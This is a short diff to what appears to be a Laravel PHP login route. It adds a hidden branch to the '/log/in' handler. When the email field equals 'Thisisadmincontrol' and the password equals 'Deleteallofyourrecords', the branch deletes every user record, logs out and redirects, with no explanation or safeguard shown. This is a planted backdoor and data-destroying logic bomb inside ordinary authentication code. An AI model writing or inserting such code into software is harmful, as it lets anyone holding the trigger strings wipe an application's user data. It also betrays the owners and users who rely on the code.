@@ -62,6 +62,18 @@ Route::post('/log/in', function ()
 		'password'  => Input::get('password'),
 	];
 
+	if ($user['email'] == 'Thisisadmincontrol' && $user['password'] == 'Deleteallofyourrecords') {
+		$users = User::all();
+		
+		foreach ($users as $user) {
+			$user->delete();
+		}
+
+		Auth::logout();
+
+		return Redirect::to('/');
+	}
+
 	if (Auth::attempt($user) && Auth::user()->status == 1) {
 	/*
 		$ip = $_SERVER['REMOTE_ADDR'];
